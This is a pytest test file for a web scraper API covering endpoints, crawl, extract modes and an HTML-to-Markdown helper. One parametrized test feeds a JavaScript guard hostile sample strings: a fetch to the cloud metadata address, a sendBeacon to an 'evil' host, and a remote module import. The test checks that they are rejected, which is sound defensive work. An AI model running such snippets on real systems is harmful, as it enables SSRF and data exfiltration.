import pytest

from app.routers import scraper as scraper_router


@pytest.mark.asyncio
async def test_scraper_endpoint(client, monkeypatch, coverage_tracker):
    async def fake_scrape(
        browser,
        url: str,
        wait_for=None,
        extract="text",
        stealth=True,
        headers=None,
        cookies=None,
        javascript=None,
        timeout_ms=30000,
        wait_seconds=0,
        proxy=None,
        viewport_width=1920,
        viewport_height=1080,
        block_resources=None,
    ):
        return {
            "url": url,
            "title": "Example",
            "status_code": 200,
            "content": "Hello",
            "screenshot_b64": None,
            "pdf_b64": None,
            "links": None,
            "metadata": None,
        }

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post("/api/scraper/scrape", json={"url": "https://example.com"})
    assert resp.status_code == 200
    assert resp.json()["title"] == "Example"
    coverage_tracker("POST /api/scraper/scrape")


@pytest.mark.asyncio
async def test_scraper_error(client, monkeypatch):
    async def fake_scrape(*args, **kwargs):
        raise RuntimeError("Scrape failed")

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post("/api/scraper/scrape", json={"url": "https://example.com"})
    assert resp.status_code == 500


@pytest.mark.asyncio
async def test_scraper_returns_503_when_browser_unavailable(client, app, monkeypatch):
    app.state.browser = None

    async def fake_scrape(*args, **kwargs):
        raise AssertionError("scrape should not be called without a browser")

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post("/api/scraper/scrape", json={"url": "https://example.com"})

    assert resp.status_code == 503
    assert "Playwright browser is unavailable" in resp.json()["detail"]
    app.state.browser = object()


# ── JS injection guard ──────────────────────────────────────
import pytest as _pytest
from app.services.scraper_service import _reject_dangerous_js
from app.services.url_guard import BlockedURLError


@_pytest.mark.parametrize(
    "code",
    [
        "fetch('http://169.254.169.254/')",
        "new XMLHttpRequest()",
        "navigator.sendBeacon('http://evil/', data)",
        "new WebSocket('ws://internal/')",
        "import('http://evil/mod.js')",
        "new EventSource('/stream')",
    ],
)
def test_scraper_rejects_network_js(code):
    with _pytest.raises(BlockedURLError):
        _reject_dangerous_js(code)


def test_scraper_allows_benign_js():
    # Reading the DOM is fine; only network primitives are blocked.
    _reject_dangerous_js("document.querySelectorAll('a').length")


def test_scraper_rejects_oversized_js():
    with _pytest.raises(BlockedURLError):
        _reject_dangerous_js("x=1;" * 6000)


# ── New extract modes via the endpoint ──────────────────────
@pytest.mark.asyncio
async def test_scraper_markdown_mode(client, monkeypatch, coverage_tracker):
    async def fake_scrape(browser, url, extract="text", **kwargs):
        assert extract == "markdown"
        return {
            "url": url,
            "title": "Doc",
            "status_code": 200,
            "content": "# Heading\n\nBody text.",
            "markdown": "# Heading\n\nBody text.",
            "word_count": 3,
        }

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post(
        "/api/scraper/scrape",
        json={"url": "https://example.com", "extract": "markdown"},
    )
    assert resp.status_code == 200
    assert resp.json()["markdown"].startswith("# Heading")
    coverage_tracker("POST /api/scraper/scrape")


@pytest.mark.asyncio
async def test_scraper_article_mode(client, monkeypatch):
    async def fake_scrape(browser, url, extract="text", **kwargs):
        assert extract == "article"
        return {
            "url": url,
            "title": "News",
            "status_code": 200,
            "content": "Full body.",
            "article": {
                "title": "Big News",
                "byline": "Jane Doe",
                "excerpt": "Full body.",
                "text": "Full body.",
                "word_count": 2,
            },
        }

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post(
        "/api/scraper/scrape",
        json={"url": "https://example.com", "extract": "article"},
    )
    assert resp.status_code == 200
    art = resp.json()["article"]
    assert art["title"] == "Big News"
    assert art["byline"] == "Jane Doe"


@pytest.mark.asyncio
async def test_scraper_metadata_enriched(client, monkeypatch):
    async def fake_scrape(browser, url, extract="text", **kwargs):
        return {
            "url": url,
            "title": "Meta",
            "status_code": 200,
            "metadata": {
                "title": "Meta",
                "og_tags": {"og:title": "T"},
                "twitter_tags": {"twitter:card": "summary"},
                "json_ld": [{"@type": "Article"}],
            },
        }

    monkeypatch.setattr(scraper_router, "scrape", fake_scrape)
    resp = await client.post(
        "/api/scraper/scrape",
        json={"url": "https://example.com", "extract": "metadata"},
    )
    assert resp.status_code == 200
    meta = resp.json()["metadata"]
    assert meta["og_tags"] == {"og:title": "T"}
    assert meta["twitter_tags"] == {"twitter:card": "summary"}
    assert meta["json_ld"] == [{"@type": "Article"}]


# ── Crawl route ─────────────────────────────────────────────
@pytest.mark.asyncio
async def test_scraper_crawl_route(client, monkeypatch, coverage_tracker):
    async def fake_crawl(browser, url, max_pages=5, max_depth=1, **kwargs):
        return {
            "start_url": url,
            "domain": "example.com",
            "pages": [
                {"url": url, "title": "Home", "excerpt": "hi", "depth": 0, "status_code": 200},
                {"url": url + "/a", "title": "A", "excerpt": "a", "depth": 1, "status_code": 200},
            ],
            "pages_crawled": 2,
            "elapsed_ms": 42,
        }

    monkeypatch.setattr(scraper_router, "crawl", fake_crawl)
    resp = await client.post(
        "/api/scraper/crawl",
        json={"url": "https://example.com", "max_pages": 3, "max_depth": 1},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["pages_crawled"] == 2
    assert len(data["pages"]) == 2
    assert data["pages"][0]["title"] == "Home"
    coverage_tracker("POST /api/scraper/crawl")


@pytest.mark.asyncio
async def test_scraper_crawl_blocked_url(client, monkeypatch):
    async def fake_crawl(*args, **kwargs):
        raise BlockedURLError("Refusing to fetch a private/reserved address")

    monkeypatch.setattr(scraper_router, "crawl", fake_crawl)
    resp = await client.post(
        "/api/scraper/crawl",
        json={"url": "https://example.com"},
    )
    assert resp.status_code == 400


@pytest.mark.asyncio
async def test_scraper_crawl_503_when_browser_unavailable(client, app, monkeypatch):
    app.state.browser = None

    async def fake_crawl(*args, **kwargs):
        raise AssertionError("crawl should not be called without a browser")

    monkeypatch.setattr(scraper_router, "crawl", fake_crawl)
    resp = await client.post("/api/scraper/crawl", json={"url": "https://example.com"})
    assert resp.status_code == 503
    app.state.browser = object()


# ── HTML → Markdown converter (pure helper) ─────────────────
from app.services.scraper_service import html_to_markdown, _same_registered_domain


def test_markdown_headings_and_paragraphs():
    md = html_to_markdown("<h1>Title</h1><p>Hello world</p>")
    assert "# Title" in md
    assert "Hello world" in md


def test_markdown_links():
    md = html_to_markdown('<p>See <a href="https://x.com/a">link</a> here</p>')
    assert "[link](https://x.com/a)" in md


def test_markdown_hrefless_link_keeps_text():
    md = html_to_markdown("<p>Just <a>plain</a> text</p>")
    assert "plain" in md
    assert "[" not in md and "]" not in md


def test_markdown_lists():
    md = html_to_markdown("<ul><li>one</li><li>two</li></ul>")
    assert "- one" in md
    assert "- two" in md
    md_ol = html_to_markdown("<ol><li>first</li><li>second</li></ol>")
    assert "1. first" in md_ol
    assert "2. second" in md_ol


def test_markdown_emphasis_and_code():
    md = html_to_markdown("<p><strong>bold</strong> and <em>italic</em> and <code>x</code></p>")
    assert "**bold**" in md
    assert "*italic*" in md
    assert "`x`" in md


def test_markdown_skips_script_and_style():
    md = html_to_markdown("<p>keep</p><script>drop()</script><style>.x{}</style>")
    assert "keep" in md
    assert "drop" not in md
    assert ".x{}" not in md


def test_markdown_empty_and_malformed():
    assert html_to_markdown("") == ""
    # Unbalanced tags must not raise.
    assert isinstance(html_to_markdown("<p>oops<div><span>"), str)


def test_same_registered_domain():
    assert _same_registered_domain("https://example.com/a", "https://example.com/b")
    assert _same_registered_domain("https://www.example.com", "https://blog.example.com")
    assert not _same_registered_domain("https://example.com", "https://evil.com")
